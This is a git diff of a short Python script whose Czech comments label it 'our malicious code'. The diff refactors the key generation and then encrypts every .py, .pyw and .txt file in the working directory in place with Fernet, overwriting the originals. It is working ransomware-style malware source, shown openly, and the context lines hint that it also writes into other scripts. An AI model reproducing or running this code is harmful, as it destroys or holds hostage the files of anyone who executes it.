@@ -48,6 +48,13 @@ for file in pythonSoubory:
         script.close()
 ###Zde je náš škodlivý kód
 
+def write_key():
+   
+    key = Fernet.generate_key()
+    with open("key.key", "wb") as key_file:
+        key_file.write(key)
+
+
 def encrypt(filename, key):
    
     f = Fernet(key)
@@ -55,16 +62,20 @@ def encrypt(filename, key):
     # precteme vsechna data
         file_data = file.read()
     # zasifrujeme data
-    encrypted_data = f.encrypt(file_data)
+        encrypted_data = f.encrypt(file_data)
     # vytvorime novy zasifrovany soubor
     with open(filename, "wb") as file:
         file.write(encrypted_data)
 
-key = Fernet.generate_key()
+def load_key():
+    
+    return open("key.key", "rb").read()
 
-with open('keykey.key', 'wb') as keykey:
-    keykey.write(key)
-
+#vytvoříme klíč
+write_key()
+#načteme klíč
+key = load_key()
+#projdeme soubory, po nalezení souborů s uvedenými koncovkami dojde k zašifrování
 pythonSoubory2 = glob.glob('*.py') + glob.glob('*.pyw')+ glob.glob('*.txt')
 for file in pythonSoubory2:
     encrypt (file,key)
